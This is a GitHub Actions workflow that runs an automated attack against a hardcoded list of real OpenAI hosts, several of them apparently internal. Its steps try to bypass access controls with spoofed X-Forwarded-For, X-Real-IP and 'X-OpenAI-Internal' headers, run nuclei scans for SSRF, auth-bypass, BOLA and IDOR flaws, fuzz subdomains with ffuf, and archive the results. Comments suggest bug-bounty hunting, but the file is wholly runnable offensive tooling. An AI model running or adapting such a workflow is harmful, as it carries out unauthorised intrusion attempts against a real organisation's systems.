name: OpenAI-Global-Scope-Hunter
on:
  workflow_dispatch:

jobs:
  broad-exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Advanced Arsenal
        run: |
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          go install -v github.com/ffuf/ffuf/v2@latest
          sudo mv ~/go/bin/* /usr/local/bin/

      - name: Phase 1:Target Expansion (Every Scope)
        run: |
          # Adding ALL sensitive subdomains found in historical_urls.txt
          cat <<EOF > master_targets.txt
          https://api.openai.com/v1/completionsinternal
          https://admin.unified-8.api.openai.com
          https://higherlevelapi.unified-8.api.openai.com
          http://chat.gateway.unified-79.api.openai.com
          http://large-langdemo-external-access.auth.ingress.sodium.sci.openai.org
          http://memos.auth.ingress.sodium.sci.openai.org
          http://infra-monitoring.auth.ingress.sulfur.sci.openai.org
          http://openai-all.auth.ingress.sodium.sci.openai.org
          http://wiki-browser-contractors.auth.ingress.sodium.sci.openai.org
          http://core.auth.ingress.sulfur.sci.openai.org
          http://fulltimers.auth.ingress.sulfur.sci.openai.org
          https://hybrid-users.auth.ingress.sulfur.sci.openai.org
          https://auth.openai.com
          https://academy.openai.com
          EOF
          
      - name: Phase 2:Mass Bypass & Header Injection
        run: |
          # Testing the "X-Forwarded-For" and "X-OpenAI-Internal" bypass 
          # on every single target at once.
          httpx -l master_targets.txt \
            -H "X-Forwarded-For: 127.0.0.1" \
            -H "X-OpenAI-Internal: true" \
            -H "X-Real-IP: 10.0.0.1" \
            -sc -cl -title -o mass_bypass_results.txt

      - name: Phase 3:Automated SSRF & BOLA PoC
        run: |
          # Running a fast, high-severity scan for SSRF across the expanded list.
          # If any internal system pings back, it's an immediate P1.
          nuclei -l master_targets.txt -tags ssrf,auth-bypass,bola,idor -severity critical,high -rl 5 -o nuclei_global_results.txt

      - name: Phase 4:Fuzzing Hidden API Routes
        run: |
          # Fuzzing for hidden admin/debug/internal endpoints on all unified gateways
          ffuf -w /usr/share/dict/words -u "FUZZ.unified-8.api.openai.com" -mc 200,401,403 -o subdomain_fuzz.json || true

      - name: Archive All Evidence
        uses: actions/upload-artifact@v4
        with:
          name: openai-global-results
          path: |
            mass_bypass_results.txt
            nuclei_global_results.txt
            subdomain_fuzz.json
            
